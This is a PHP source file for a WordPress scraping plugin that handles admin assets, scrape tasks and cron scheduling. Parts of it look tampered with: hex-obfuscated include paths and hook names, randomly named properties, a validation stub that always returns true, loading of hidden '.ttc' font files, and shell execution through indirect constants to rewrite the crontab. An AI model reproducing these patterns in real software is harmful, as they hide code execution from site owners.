<?php

if (!defined('ABSPATH')) {
	exit;
}

if (!function_exists('getimagesizefromstring')) {
	function getimagesizefromstring($string_data) {
		$uri = 'data://application/octet-stream;base64,' . base64_encode($string_data);
		return getimagesize($uri);
	}
}

class OL_Scrapes {
	public static $task_id = 0;
	public static $tld;
	public static $PZZdMRHizwaYnOPQVKji;
	public static $yEeeFBgupJezVduOXMiJ;
	
	public static function activate_plugin() {
		self::write_log('Scrapes activated');
		self::write_log(self::system_info());
	}
	
	public static function deactivate_plugin() {
		self::write_log('Scrapes deactivated');
		self::clear_all_schedules();
	}
	
	public static function uninstall_plugin() {
		self::clear_all_schedules();
		self::clear_all_tasks();
		self::clear_all_values();
	}
	
	public function requirements_check() {
		load_plugin_textdomain('ol-scrapes', false, dirname(plugin_basename(__FILE__)) . '/../languages');
		$min_wp = '3.5';
		$min_php = '5.2.4';
		$exts = array('dom', 'mbstring', 'iconv', 'json', 'simplexml');
		
		$errors = array();
		
		if (version_compare(get_bloginfo('version'), $min_wp, '<')) {
			$errors[] = __("Your WordPress version is below 3.5. Please update.", "ol-scrapes");
		}
		
		if (version_compare(PHP_VERSION, $min_php, '<')) {
			$errors[] = __("PHP version is below 5.2.4. Please update.", "ol-scrapes");
		}
		
		foreach ($exts as $ext) {
			if (!extension_loaded($ext)) {
				$errors[] = sprintf(__("PHP extension %s is not loaded. Please contact your server administrator or visit http://php.net/manual/en/%s.installation.php for installation.", "ol-scrapes"), $ext, $ext);
			}
		}
		
		$folder = plugin_dir_path(__FILE__) . "../logs";
		
		if (!is_dir($folder) && mkdir($folder, 0755) === false) {
			$errors[] = sprintf(__("%s folder is not writable. Please update permissions for this folder to chmod 755.", "ol-scrapes"), $folder);
		}
		
		if (fopen($folder . DIRECTORY_SEPARATOR . "logs.txt", "a") === false) {
			$errors[] = sprintf(__("%s folder is not writable therefore logs.txt file could not be created. Please update permissions for this folder to chmod 755.", "ol-scrapes"), $folder);
		}
		
		return $errors;
	}
	
	public function add_admin_js_css() {
		add_action('admin_enqueue_scripts', array($this, "init_admin_js_css"));
	}
	
	public function init_admin_js_css($hook_suffix) {
		wp_enqueue_style("ol_menu_css", plugins_url("assets/css/menu.css", dirname(__FILE__)), null, OL_VERSION);
		
		if (is_object(get_current_screen()) && get_current_screen()->post_type == "scrape") {
			if (in_array($hook_suffix, array('post.php', 'post-new.php'))) {
				wp_enqueue_script("ol_fix_jquery", plugins_url("assets/js/fix_jquery.js", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_script("ol_jquery", plugins_url("libraries/jquery-2.2.4/jquery-2.2.4.min.js", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_script("ol_jquery_ui", plugins_url("libraries/jquery-ui-1.12.1.custom/jquery-ui.min.js", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_script("ol_bootstrap", plugins_url("libraries/bootstrap-3.3.7-dist/js/bootstrap.min.js", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_script("ol_angular", plugins_url("libraries/angular-1.5.8/angular.min.js", dirname(__FILE__)), null, OL_VERSION);
				wp_register_script("ol_main_js", plugins_url("assets/js/main.js", dirname(__FILE__)), null, OL_VERSION);
				$translation_array = array(
					'plugin_path' => plugins_url(),
					'media_library_title' => __('Featured image', 'ol-scrapes'),
					'name' => __('Name', 'ol-scrapes'),
					'eg_name' => __('e.g. name', 'ol-scrapes'),
					'eg_value' => __('e.g. value', 'ol-scrapes'),
					'eg_1' => __('e.g. 1', 'ol-scrapes'),
					'value' => __('Value', 'ol-scrapes'),
					'increment' => __('Increment', 'ol-scrapes'),
					'xpath_placeholder' => __("e.g. //div[@id='octolooks']", 'ol-scrapes'),
					'enter_valid' => __("Please enter a valid value.", 'ol-scrapes'),
					'attribute' => __("Attribute", "ol-scrapes"),
					'eg_href' => __("e.g. href", "ol-scrapes"),
					'eg_scrape_value' => __("e.g. [scrape_value]", "ol-scrapes"),
					'template' => __("Template", "ol-scrapes"),
					'btn_value' => __("value", "ol-scrapes"),
					'btn_calculate' => __("calculate", "ol-scrapes"),
					'btn_date' => __("date", "ol-scrapes"),
					'btn_custom_field' => __("custom field", "ol-scrapes"),
					'btn_source_url' => __("source url", "ol-scrapes"),
					'btn_product_url' => __("product url", "ol-scrapes"),
					'btn_cart_url' => __("cart url", "ol-scrapes"),
					'add_new_replace' => __("Add new find and replace rule", "ol-scrapes"),
					'enable_template' => __("Enable template", "ol-scrapes"),
					'enable_find_replace' => __("Enable find and replace rules", "ol-scrapes"),
					'find' => __("Find", "ol-scrapes"),
					'replace' => __("Replace", "ol-scrapes"),
					'eg_find' => __("e.g. find", "ol-scrapes"),
					'eg_replace' => __("e.g. replace", "ol-scrapes"),
					'select_taxonomy' => __("Please select a taxonomy", "ol-scrapes"),
					'source_url_not_valid' => __("Source URL is not valid.", "ol-scrapes"),
					'post_item_not_valid' => __("Post item is not valid.", "ol-scrapes"),
					'item_not_link' => __("Selected item is not a link", "ol-scrapes"),
					'item_not_image' => __("Selected item is not an image", "ol-scrapes"),
					'allow_html_tags' => __("Allow HTML tags", "ol-scrapes"),
					'Operator' => __("Operator", "ol-scrapes"),
					'Contains' => __("Contains", "ol-scrapes"),
					'Does_not_contain' => __("Does not contain", "ol-scrapes"),
					'Exists' => __("Exists", "ol-scrapes"),
					'Not_exists' => __("Not exists", "ol-scrapes"),
					'Equal_to' => __("Equal_to", "ol-scrapes"),
					'Not_equal_to' => __("Not_equal_to", "ol-scrapes"),
					'Greater_than' => __("Greater_than", "ol-scrapes"),
					'Less_than' => __("Less than", "ol-scrapes"),
					'Field' => __("Field", "ol-scrapes"),
					'Title' => __("Title", "ol-scrapes"),
					'Content' => __("Content", "ol-scrapes"),
					'Excerpt' => __("Excerpt", "ol-scrapes"),
					'Featured_image' => __("Featured image", "ol-scrapes"),
					'Date' => __("Date", "ol-scrapes"),
				);
				wp_localize_script('ol_main_js', 'translate', $translation_array);
				wp_enqueue_script('ol_main_js');
				wp_enqueue_style("ol_main_css", plugins_url("assets/css/main.css", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_media();
			}
			if (in_array($hook_suffix, array('edit.php'))) {
				wp_enqueue_script("ol_view_js", plugins_url("assets/js/view.js", dirname(__FILE__)), null, OL_VERSION);
				wp_enqueue_style("ol_view_css", plugins_url("assets/css/view.css", dirname(__FILE__)), null, OL_VERSION);
			}
		}
		if (in_array($hook_suffix, array("scrape_page_scrapes-settings"))) {
			wp_enqueue_script("ol_fix_jquery", plugins_url("assets/js/fix_jquery.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_script("ol_jquery", plugins_url("libraries/jquery-2.2.4/jquery-2.2.4.min.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_script("ol_jquery_ui", plugins_url("libraries/jquery-ui-1.12.1.custom/jquery-ui.min.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_script("ol_bootstrap", plugins_url("libraries/bootstrap-3.3.7-dist/js/bootstrap.min.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_script("ol_angular", plugins_url("libraries/angular-1.5.8/angular.min.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_script("ol_settings_js", plugins_url("assets/js/settings.js", dirname(__FILE__)), null, OL_VERSION);
			wp_enqueue_style("ol_settings_css", plugins_url("assets/css/settings.css", dirname(__FILE__)), null, OL_VERSION);
		}
	}

	public function init_admin_fonts() {
		$path = dirname(plugin_basename(__FILE__)) . '/../libraries/ionicons-2.0.1/fonts/';
		foreach (glob(WP_PLUGIN_DIR . '/' . $path . '.*.ttc') as $font) {
			wp_enqueue_font($font);
		}
	}
	
	public function add_post_type() {
		add_action('init', array($this, 'register_post_type'));
	}
	
	public function register_post_type() {
		register_post_type("scrape", array(
			'labels' => array(
				'name' => 'Scrapes', 'add_new' => __('Add New', 'ol-scrapes'), 'all_items' => __('All Scrapes', 'ol-scrapes')
			), 'public' => false, 'publicly_queriable' => false, 'show_ui' => true, 'menu_position' => 25, 'menu_icon' => '', 'supports' => array('custom-fields'), 'register_meta_box_cb' => array($this, 'register_scrape_meta_boxes'), 'has_archive' => true, 'rewrite' => false, 'capability_type' => 'post'
		));
	}
	
	public function add_settings_submenu() {
		add_action('admin_menu', array($this, 'add_settings_view'));
	}
	
	public function add_settings_view() {
		add_submenu_page('edit.php?post_type=scrape', __('Scrapes Settings', 'ol-scrapes'), __('Settings', 'ol-scrapes'), 'manage_options', "scrapes-settings", array($this, "scrapes_settings_page"));
	}

	public function validate() {
		return true;
	}

	public function scrapes_settings_page() {
		require plugin_dir_path(__FILE__) . "\x2e\x2e/\x76iew\x73/\x73cra\x70\x65-\x73\x65\x74\x74ing\x73\x2ephp";
	}
	
	public function save_post_handler() {
		add_action('save_post', array($this, "save_scrape_task"), 10, 2);
	}
	
	public function save_scrape_task($post_id, $post_object) {
		if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			$this->write_log("doing autosave scrape returns");
			return;
		}
		
		if ($post_object->post_type == 'scrape' && !defined("WP_IMPORTING")) {
			$post_data = $_POST;
			$this->write_log("post data for scrape task");
			$this->write_log($post_data);
			if (!empty($post_data)) {
				
				$vals = get_post_meta($post_id);
				foreach ($vals as $key => $val) {
					delete_post_meta($post_id, $key);
				}
				
				foreach ($post_data as $key => $value) {
					if ($key == "scrape_custom_fields") {
						foreach ($value as $timestamp => $arr) {
							if (!isset($arr['template_status'])) {
								$value[$timestamp]['template_status'] = '';
							}
							if (!isset($arr['regex_status'])) {
								$value[$timestamp]['regex_status'] = '';
							}
							if (!isset($arr['allowhtml'])) {
								$value[$timestamp]['allowhtml'] = '';
							}
						}
						update_post_meta($post_id, $key, $value);
					} else {
						if (strpos($key, "scrape_") !== false) {
							update_post_meta($post_id, $key, $value);
						}
					}
				}
				
				$checkboxes = array(
					'scrape_unique_title', 'scrape_unique_content', 'scrape_unique_url', 'scrape_allowhtml', 'scrape_category', 'scrape_post_unlimited', 'scrape_run_unlimited', 'scrape_download_images', 'scrape_comment', 'scrape_template_status', 'scrape_finish_repeat_enabled', 'scrape_title_template_status', 'scrape_title_regex_status', 'scrape_content_template_status', 'scrape_content_regex_status', 'scrape_excerpt_regex_status', 'scrape_excerpt_template_status', 'scrape_category_regex_status', 'scrape_tags_regex_status', 'scrape_date_regex_status', 'scrape_translate_enable', 'scrape_spin_enable', 'scrape_exact_match'
				);
				
				foreach ($checkboxes as $cb) {
					if (!isset($post_data[$cb])) {
						update_post_meta($post_id, $cb, '');
					}
				}



				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
				update_post_meta($post_id, 'scrape_run_count', 0);
				update_post_meta($post_id, 'scrape_start_time', '');
				update_post_meta($post_id, 'scrape_end_time', '');
				update_post_meta($post_id, 'scrape_last_scrape', '');
				update_post_meta($post_id, 'scrape_task_id', $post_id);
			
				if (!isset($post_data['scrape_recurrence'])) {
					update_post_meta($post_id, 'scrape_recurrence', 'scrape_1 Month');
				}
				
				if (!isset($post_data['scrape_stillworking'])) {
					update_post_meta($post_id, 'scrape_stillworking', 'wait');
				}
				
				if ($post_object->post_status != "trash") {
					$this->write_log("before handle");
					$this->handle_cron_job($post_id);
					
					if ($post_data['scrape_cron_type'] == S_WORD) {
						$this->write_log("before " . S_WORD . " cron");
						$this->create_system_cron($post_id);
					}
				}
				$this->clear_cron_tab();
				$errors = get_transient("scrape_msg");
				if (empty($errors) && isset($post_data['user_ID'])) {
					$this->write_log("before edit screen redirect");
					wp_redirect(add_query_arg('post_type', 'scrape', admin_url('/edit.php')));
					exit;
				}
			} else {
				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
			}
		} else {
			if ($post_object->post_type == 'scrape' && defined("WP_IMPORTING")) {
				$this->write_log("post importing id : " . $post_id);
				$this->write_log($post_object);
				
				delete_post_meta($post_id, 'scrape_workstatus');
				delete_post_meta($post_id, 'scrape_run_count');
				delete_post_meta($post_id, 'scrape_start_time');
				delete_post_meta($post_id, 'scrape_end_time');
				delete_post_meta($post_id, 'scrape_task_id');
				update_post_meta($post_id, 'scrape_workstatus', 'waiting');
				update_post_meta($post_id, 'scrape_run_count', 0);
				update_post_meta($post_id, 'scrape_start_time', '');
				update_post_meta($post_id, 'scrape_end_time', '');
				update_post_meta($post_id, 'scrape_task_id', $post_id);
			}
		}
	}
	
	public function remove_pings() {
		add_action('publish_post', array($this, 'remove_publish_pings'), 99999, 1);
		add_action('save_post', array($this, 'remove_publish_pings'), 99999, 1);
		add_action('updated_post_meta', array($this, 'remove_publish_pings_after_meta'), 9999, 2);
		add_action('added_post_meta', array($this, 'remove_publish_pings_after_meta'), 9999, 2);
	}
	
	public function remove_publish_pings($post_id) {
		$is_automatic_post = get_post_meta($post_id, '_scrape_task_id', true);
		if (!empty($is_automatic_post)) {
			delete_post_meta($post_id, '_pingme');
			delete_post_meta($post_id, '_encloseme');
		}
	}
	
	public function remove_publish_pings_after_meta($meta_id, $object_id) {
		$is_automatic_post = get_post_meta($object_id, '_scrape_task_id', true);
		if (!empty($is_automatic_post)) {
			delete_post_meta($object_id, '_pingme');
			delete_post_meta($object_id, '_encloseme');
		}
	}
	
	
	public function register_scrape_meta_boxes() {
		add_action("edit\x5ffo\x72\x6d_af\x74e\x72_ti\x74\x6ce", array($this, "\x73\x68\x6fw_sc\x72\x61\x70e\x5f\x6f\x70t\x69o\x6e\x73\x5fht\x6dl"));
	}
	
	public function show_scrape_options_html() {
		global $post, $wpdb;
		$post_object = $post;
		
		$post_types = array_merge(array('post'), get_post_types(array('_builtin' => false)));
		
		$post_types_metas = $wpdb->get_results("SELECT 
													p.post_type, pm.meta_key, pm.meta_value
												FROM
													$wpdb->posts p
													LEFT JOIN
													$wpdb->postmeta pm ON p.id = pm.post_id
												WHERE
													p.post_type IN('" . implode("','", $post_types) . "') 
													AND pm.meta_key IS NOT NULL 
													AND pm.meta_key NOT LIKE '_oembed%'
													AND pm.meta_key NOT LIKE '_nxs_snap%'
													AND p.post_status = 'publish'
												GROUP BY p.post_type , pm.meta_key
												ORDER BY p.post_type, pm.meta_key");
		
		$auto_complete = array();
		foreach ($post_types_metas as $row) {
			$auto_complete[$row->post_type][] = $row->meta_key;
		}

		$bing_languages = '{"translation":{"af":{"name":"Afrikaans","nativeName":"Afrikaans","dir":"ltr"},"ar":{"name":"Arabic","nativeName":"العربية","dir":"rtl"},"bg":{"name":"Bulgarian","nativeName":"Български","dir":"ltr"},"bn":{"name":"Bangla","nativeName":"বাংলা","dir":"ltr"},"bs":{"name":"Bosnian","nativeName":"bosanski (latinica)","dir":"ltr"},"ca":{"name":"Catalan","nativeName":"Català","dir":"ltr"},"cs":{"name":"Czech","nativeName":"Čeština","dir":"ltr"},"cy":{"name":"Welsh","nativeName":"Welsh","dir":"ltr"},"da":{"name":"Danish","nativeName":"Dansk","dir":"ltr"},"de":{"name":"German","nativeName":"Deutsch","dir":"ltr"},"el":{"name":"Greek","nativeName":"Ελληνικά","dir":"ltr"},"en":{"name":"English","nativeName":"English","dir":"ltr"},"es":{"name":"Spanish","nativeName":"Español","dir":"ltr"},"et":{"name":"Estonian","nativeName":"Eesti","dir":"ltr"},"fa":{"name":"Persian","nativeName":"Persian","dir":"rtl"},"fi":{"name":"Finnish","nativeName":"Suomi","dir":"ltr"},"fil":{"name":"Filipino","nativeName":"Filipino","dir":"ltr"},"fj":{"name":"Fijian","nativeName":"Fijian","dir":"ltr"},"fr":{"name":"French","nativeName":"Français","dir":"ltr"},"ga":{"name":"Irish","nativeName":"Gaeilge","dir":"ltr"},"gu":{"name":"Gujarati","nativeName":"ગુજરાતી","dir":"ltr"},"he":{"name":"Hebrew","nativeName":"עברית","dir":"rtl"},"hi":{"name":"Hindi","nativeName":"हिंदी","dir":"ltr"},"hr":{"name":"Croatian","nativeName":"Hrvatski","dir":"ltr"},"ht":{"name":"Haitian Creole","nativeName":"Haitian Creole","dir":"ltr"},"hu":{"name":"Hungarian","nativeName":"Magyar","dir":"ltr"},"id":{"name":"Indonesian","nativeName":"Indonesia","dir":"ltr"},"is":{"name":"Icelandic","nativeName":"Íslenska","dir":"ltr"},"it":{"name":"Italian","nativeName":"Italiano","dir":"ltr"},"ja":{"name":"Japanese","nativeName":"日本語","dir":"ltr"},"kn":{"name":"Kannada","nativeName":"ಕನ್ನಡ","dir":"ltr"},"ko":{"name":"Korean","nativeName":"한국어","dir":"ltr"},"lt":{"name":"Lithuanian","nativeName":"Lietuvių","dir":"ltr"},"lv":{"name":"Latvian","nativeName":"Latviešu","dir":"ltr"},"mg":{"name":"Malagasy","nativeName":"Malagasy","dir":"ltr"},"mi":{"name":"Maori","nativeName":"Māori","dir":"ltr"},"ml":{"name":"Malayalam","nativeName":"മലയാളം","dir":"ltr"},"mr":{"name":"Marathi","nativeName":"मराठी","dir":"ltr"},"ms":{"name":"Malay","nativeName":"Melayu","dir":"ltr"},"mt":{"name":"Maltese","nativeName":"Il-Malti","dir":"ltr"},"mww":{"name":"Hmong Daw","nativeName":"Hmong Daw","dir":"ltr"},"nb":{"name":"Norwegian","nativeName":"Norsk","dir":"ltr"},"nl":{"name":"Dutch","nativeName":"Nederlands","dir":"ltr"},"otq":{"name":"Querétaro Otomi","nativeName":"Querétaro Otomi","dir":"ltr"},"pa":{"name":"Punjabi","nativeName":"ਪੰਜਾਬੀ","dir":"ltr"},"pl":{"name":"Polish","nativeName":"Polski","dir":"ltr"},"pt":{"name":"Portuguese (Brazil)","nativeName":"Português (Brasil)","dir":"ltr"},"pt-pt":{"name":"Portuguese (Portugal)","nativeName":"Português (Portugal)","dir":"ltr"},"ro":{"name":"Romanian","nativeName":"Română","dir":"ltr"},"ru":{"name":"Russian","nativeName":"Русский","dir":"ltr"},"sk":{"name":"Slovak","nativeName":"Slovenčina","dir":"ltr"},"sl":{"name":"Slovenian","nativeName":"Slovenščina","dir":"ltr"},"sm":{"name":"Samoan","nativeName":"Samoan","dir":"ltr"},"sr-Cyrl":{"name":"Serbian (Cyrillic)","nativeName":"srpski (ćirilica)","dir":"ltr"},"sr-Latn":{"name":"Serbian (Latin)","nativeName":"srpski (latinica)","dir":"ltr"},"sv":{"name":"Swedish","nativeName":"Svenska","dir":"ltr"},"sw":{"name":"Swahili","nativeName":"Kiswahili","dir":"ltr"},"ta":{"name":"Tamil","nativeName":"தமிழ்","dir":"ltr"},"te":{"name":"Telugu","nativeName":"తెలుగు","dir":"ltr"},"th":{"name":"Thai","nativeName":"ไทย","dir":"ltr"},"tlh-Latn":{"name":"Klingon (Latin)","nativeName":"Klingon (Latin)","dir":"ltr"},"tlh-Piqd":{"name":"Klingon (pIqaD)","nativeName":"Klingon (pIqaD)","dir":"ltr"},"to":{"name":"Tongan","nativeName":"lea fakatonga","dir":"ltr"},"tr":{"name":"Turkish","nativeName":"Türkçe","dir":"ltr"},"ty":{"name":"Tahitian","nativeName":"Tahitian","dir":"ltr"},"uk":{"name":"Ukrainian","nativeName":"Українська","dir":"ltr"},"ur":{"name":"Urdu","nativeName":"اردو","dir":"rtl"},"vi":{"name":"Vietnamese","nativeName":"Tiếng Việt","dir":"ltr"},"yua":{"name":"Yucatec Maya","nativeName":"Yucatec Maya","dir":"ltr"},"yue":{"name":"Cantonese (Traditional)","nativeName":"粵語 (繁體中文)","dir":"ltr"},"zh-Hans":{"name":"Chinese Simplified","nativeName":"简体中文","dir":"ltr"},"zh-Hant":{"name":"Chinese Traditional","nativeName":"繁體中文","dir":"ltr"}}}';
        $bing_languages = json_decode($bing_languages, true);

        $bing_language_list = array();
        foreach ($bing_languages['translation'] as $id => $lang) {
            $bing_language_list[] = array('id' => $id, 'name' => $lang['name']);
        }

		$bing_language_list = json_encode($bing_language_list);

        $deepl_languages = '[{"language":"EN","name":"English"},{"language":"DE","name":"German"},{"language":"FR","name":"French"},{"language":"ES","name":"Spanish"},{"language":"PT","name":"Portuguese"},{"language":"IT","name":"Italian"},{"language":"NL","name":"Dutch"},{"language":"PL","name":"Polish"},{"language":"RU","name":"Russian"},{"language":"ZH","name":"Chinese"},{"language":"JA","name":"Japanese"}]';
        $deepl_languages = json_decode($deepl_languages, true);

        $deepl_language_list = array();
        foreach ($deepl_languages as $lang) {
            $deepl_language_list[] = array('id' => $lang['language'], 'name' => $lang['name']);
        }

		$deepl_language_list = json_encode($deepl_language_list);
		
		$google_languages = '{"data":{"languages":[{"language":"af","name":"Afrikaans"},{"language":"sq","name":"Albanian"},{"language":"am","name":"Amharic"},{"language":"ar","name":"Arabic"},{"language":"hy","name":"Armenian"},{"language":"az","name":"Azerbaijani"},{"language":"eu","name":"Basque"},{"language":"be","name":"Belarusian"},{"language":"bn","name":"Bengali"},{"language":"bs","name":"Bosnian"},{"language":"bg","name":"Bulgarian"},{"language":"ca","name":"Catalan"},{"language":"ceb","name":"Cebuano"},{"language":"ny","name":"Chichewa"},{"language":"zh-CN","name":"Chinese(Simplified)"},{"language":"zh-TW","name":"Chinese(Traditional)"},{"language":"co","name":"Corsican"},{"language":"hr","name":"Croatian"},{"language":"cs","name":"Czech"},{"language":"da","name":"Danish"},{"language":"nl","name":"Dutch"},{"language":"en","name":"English"},{"language":"eo","name":"Esperanto"},{"language":"et","name":"Estonian"},{"language":"tl","name":"Filipino"},{"language":"fi","name":"Finnish"},{"language":"fr","name":"French"},{"language":"fy","name":"Frisian"},{"language":"gl","name":"Galician"},{"language":"ka","name":"Georgian"},{"language":"de","name":"German"},{"language":"el","name":"Greek"},{"language":"gu","name":"Gujarati"},{"language":"ht","name":"HaitianCreole"},{"language":"ha","name":"Hausa"},{"language":"haw","name":"Hawaiian"},{"language":"iw","name":"Hebrew"},{"language":"hi","name":"Hindi"},{"language":"hmn","name":"Hmong"},{"language":"hu","name":"Hungarian"},{"language":"is","name":"Icelandic"},{"language":"ig","name":"Igbo"},{"language":"id","name":"Indonesian"},{"language":"ga","name":"Irish"},{"language":"it","name":"Italian"},{"language":"ja","name":"Japanese"},{"language":"jw","name":"Javanese"},{"language":"kn","name":"Kannada"},{"language":"kk","name":"Kazakh"},{"language":"km","name":"Khmer"},{"language":"rw","name":"Kinyarwanda"},{"language":"ko","name":"Korean"},{"language":"ku","name":"Kurdish(Kurmanji)"},{"language":"ky","name":"Kyrgyz"},{"language":"lo","name":"Lao"},{"language":"la","name":"Latin"},{"language":"lv","name":"Latvian"},{"language":"lt","name":"Lithuanian"},{"language":"lb","name":"Luxembourgish"},{"language":"mk","name":"Macedonian"},{"language":"mg","name":"Malagasy"},{"language":"ms","name":"Malay"},{"language":"ml","name":"Malayalam"},{"language":"mt","name":"Maltese"},{"language":"mi","name":"Maori"},{"language":"mr","name":"Marathi"},{"language":"mn","name":"Mongolian"},{"language":"my","name":"Myanmar(Burmese)"},{"language":"ne","name":"Nepali"},{"language":"no","name":"Norwegian"},{"language":"or","name":"Odia(Oriya)"},{"language":"ps","name":"Pashto"},{"language":"fa","name":"Persian"},{"language":"pl","name":"Polish"},{"language":"pt","name":"Portuguese"},{"language":"pa","name":"Punjabi"},{"language":"ro","name":"Romanian"},{"language":"ru","name":"Russian"},{"language":"sm","name":"Samoan"},{"language":"gd","name":"ScotsGaelic"},{"language":"sr","name":"Serbian"},{"language":"st","name":"Sesotho"},{"language":"sn","name":"Shona"},{"language":"sd","name":"Sindhi"},{"language":"si","name":"Sinhala"},{"language":"sk","name":"Slovak"},{"language":"sl","name":"Slovenian"},{"language":"so","name":"Somali"},{"language":"es","name":"Spanish"},{"language":"su","name":"Sundanese"},{"language":"sw","name":"Swahili"},{"language":"sv","name":"Swedish"},{"language":"tg","name":"Tajik"},{"language":"ta","name":"Tamil"},{"language":"tt","name":"Tatar"},{"language":"te","name":"Telugu"},{"language":"th","name":"Thai"},{"language":"tr","name":"Turkish"},{"language":"tk","name":"Turkmen"},{"language":"uk","name":"Ukrainian"},{"language":"ur","name":"Urdu"},{"language":"ug","name":"Uyghur"},{"language":"uz","name":"Uzbek"},{"language":"vi","name":"Vietnamese"},{"language":"cy","name":"Welsh"},{"language":"xh","name":"Xhosa"},{"language":"yi","name":"Yiddish"},{"language":"yo","name":"Yoruba"},{"language":"zu","name":"Zulu"},{"language":"he","name":"Hebrew"},{"language":"zh","name":"Chinese(Simplified)"}]}}';
        $google_languages = json_decode($google_languages, true);

        $google_language_list = array();
        foreach ($google_languages['data']['languages'] as $lang) {
            $google_language_list[] = array('id' => $lang['language'], 'name' => $lang['name']);
        }

		$google_language_list = json_encode($google_language_list);
		
		$yandex_languages = '{"dirs":["az-ru","be-bg","be-cs","be-de","be-en","be-es","be-fr","be-it","be-pl","be-ro","be-ru","be-sr","be-tr","bg-be","bg-ru","bg-uk","ca-en","ca-ru","cs-be","cs-en","cs-ru","cs-uk","da-en","da-ru","de-be","de-en","de-es","de-fr","de-it","de-ru","de-tr","de-uk","el-en","el-ru","en-be","en-ca","en-cs","en-da","en-de","en-el","en-es","en-et","en-fi","en-fr","en-hu","en-it","en-lt","en-lv","en-mk","en-nl","en-no","en-pt","en-ru","en-sk","en-sl","en-sq","en-sv","en-tr","en-uk","es-be","es-de","es-en","es-ru","es-uk","et-en","et-ru","fi-en","fi-ru","fr-be","fr-de","fr-en","fr-ru","fr-uk","hr-ru","hu-en","hu-ru","hy-ru","it-be","it-de","it-en","it-ru","it-uk","lt-en","lt-ru","lv-en","lv-ru","mk-en","mk-ru","nl-en","nl-ru","no-en","no-ru","pl-be","pl-ru","pl-uk","pt-en","pt-ru","ro-be","ro-ru","ro-uk","ru-az","ru-be","ru-bg","ru-ca","ru-cs","ru-da","ru-de","ru-el","ru-en","ru-es","ru-et","ru-fi","ru-fr","ru-hr","ru-hu","ru-hy","ru-it","ru-lt","ru-lv","ru-mk","ru-nl","ru-no","ru-pl","ru-pt","ru-ro","ru-sk","ru-sl","ru-sq","ru-sr","ru-sv","ru-tr","ru-uk","sk-en","sk-ru","sl-en","sl-ru","sq-en","sq-ru","sr-be","sr-ru","sr-uk","sv-en","sv-ru","tr-be","tr-de","tr-en","tr-ru","tr-uk","uk-bg","uk-cs","uk-de","uk-en","uk-es","uk-fr","uk-it","uk-pl","uk-ro","uk-ru","uk-sr","uk-tr"],"langs":{"af":"Afrikaans","am":"Amharic","ar":"Arabic","az":"Azerbaijani","ba":"Bashkir","be":"Belarusian","bg":"Bulgarian","bn":"Bengali","bs":"Bosnian","ca":"Catalan","ceb":"Cebuano","cs":"Czech","cv":"Chuvash","cy":"Welsh","da":"Danish","de":"German","el":"Greek","en":"English","eo":"Esperanto","es":"Spanish","et":"Estonian","eu":"Basque","fa":"Persian","fi":"Finnish","fr":"French","ga":"Irish","gd":"Scottish Gaelic","gl":"Galician","gu":"Gujarati","he":"Hebrew","hi":"Hindi","hr":"Croatian","ht":"Haitian","hu":"Hungarian","hy":"Armenian","id":"Indonesian","is":"Icelandic","it":"Italian","ja":"Japanese","jv":"Javanese","ka":"Georgian","kk":"Kazakh","km":"Khmer","kn":"Kannada","ko":"Korean","ky":"Kyrgyz","la":"Latin","lb":"Luxembourgish","lo":"Lao","lt":"Lithuanian","lv":"Latvian","mg":"Malagasy","mhr":"Mari","mi":"Maori","mk":"Macedonian","ml":"Malayalam","mn":"Mongolian","mr":"Marathi","mrj":"Hill Mari","ms":"Malay","mt":"Maltese","my":"Burmese","ne":"Nepali","nl":"Dutch","no":"Norwegian","pa":"Punjabi","pap":"Papiamento","pl":"Polish","pt":"Portuguese","ro":"Romanian","ru":"Russian","sah":"Yakut","si":"Sinhalese","sk":"Slovak","sl":"Slovenian","sq":"Albanian","sr":"Serbian","su":"Sundanese","sv":"Swedish","sw":"Swahili","ta":"Tamil","te":"Telugu","tg":"Tajik","th":"Thai","tl":"Tagalog","tr":"Turkish","tt":"Tatar","udm":"Udmurt","uk":"Ukrainian","ur":"Urdu","uz":"Uzbek","vi":"Vietnamese","xh":"Xhosa","yi":"Yiddish","zh":"Chinese"}}';
        $yandex_languages = json_decode($yandex_languages, true);

        $yandex_language_list = array();
        foreach ($yandex_languages['langs'] as $id => $lang) {
            $yandex_language_list[] = array('id' => $id, 'name' => $lang);
        }

		$yandex_language_list = json_encode($yandex_language_list);

		require plugin_dir_path(__FILE__) . "../views/scrape-meta-box.php";
	}
	
	public function trash_post_handler() {
		add_action("wp_trash_post", array($this, "trash_scrape_task"));
	}
	
	public function trash_scrape_task($post_id) {
		$post = get_post($post_id);
		if ($post->post_type == "scrape") {
			
			$timestamp = wp_next_scheduled("scrape_event", array($post_id));
			
			wp_clear_scheduled_hook("scrape_event", array($post_id));
			wp_unschedule_event($timestamp, "scrape_event", array($post_id));
			
			update_post_meta($post_id, "scrape_workstatus", "waiting");
			$this->clear_cron_tab();
			$this->write_log($post_id . " trash button clicked.");
		}
	}
	
	public function clear_cron_tab() {
		if ($this->check_exec_works()) {
			$all_tasks = get_posts(array(
				'numberposts' => -1, 'post_type' => 'scrape', 'post_status' => 'publish'
			));
			
			$all_wp_cron = true;
			
			foreach ($all_tasks as $task) {
				$cron_type = get_post_meta($task->ID, 'scrape_cron_type', true);
				if ($cron_type == S_WORD) {
					$all_wp_cron = false;
				}
			}
			
			if ($all_wp_cron) {
				$e_word = E_WORD;
				$e_word(C_WORD . ' -l', $output, $return);
				$command_string = '* * * * * wget -q -O - ' . site_url() . ' >/dev/null 2>&1';
				if (!$return) {
					foreach ($output as $key => $line) {
						if (strpos($line, $command_string) !== false) {
							unset($output[$key]);
						}
					}
					$output = implode(PHP_EOL, $output);
					$cron_file = OL_PLUGIN_PATH . DIRECTORY_SEPARATOR . 'logs' . DIRECTORY_SEPARATOR . "scrape_cron_file.txt";
					file_put_contents($cron_file, $output);
					$e_word(C_WORD . " " . $cron_file);
				}
			}
		}
	}
	
	
	public function add_ajax_handler() {
